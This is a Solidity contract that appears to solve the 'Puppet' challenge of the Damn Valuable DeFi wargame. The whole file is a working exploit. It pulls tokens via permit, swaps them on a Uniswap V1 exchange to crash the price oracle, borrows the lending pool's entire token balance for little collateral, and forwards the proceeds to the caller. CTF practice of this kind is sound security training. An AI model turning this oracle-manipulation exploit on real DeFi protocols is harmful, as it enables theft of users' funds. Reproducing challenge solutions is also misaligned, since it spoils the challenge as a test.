pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

// Missing Uniswap V1 Exchange interface
contract PuppetAttacker {

    address exchange;
    DamnValuableToken token;
    PuppetPool pool;
    constructor(address exchange_, address token_, address pool_) {
        exchange = exchange_;
        token = DamnValuableToken(token_);
        pool = PuppetPool(pool_);
    }

    struct Permit {
        address owner;
        address spender;
        uint256 value;
        uint256 deadline;
        bytes32 r;
        bytes32 s;
        uint8 v;
    }
    function attack(Permit calldata permit) external payable {
        // Approve pulling user tokens in order to execute attack
        token.permit(
            permit.owner,
            permit.spender,
            permit.value,
            permit.deadline,
            permit.v,
            permit.r,
            permit.s
        );

        token.transferFrom(permit.owner, address(this), permit.value);
        uint256 attackerBalance = token.balanceOf(address(this));
        // Approve exchange to pull tokens
        token.approve(exchange, attackerBalance);
        // Swap tokens for ETH in order to disbalance the pool
        (bool success,) = exchange.call(abi.encodeWithSignature("tokenToEthSwapInput(uint256,uint256,uint256)", attackerBalance, 1, block.timestamp));
        if (!success) revert('Something went wrong!');
        uint256 poolBalance = token.balanceOf(address(pool));
        // Borrow all the pool tokens as now the price is lower
        pool.borrow{value: address(this).balance}(poolBalance, msg.sender);
        // Send retrieved ether to user
        payable(msg.sender).transfer(address(this).balance);
        // Send borrowed tokens to user
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    receive() external payable {}
}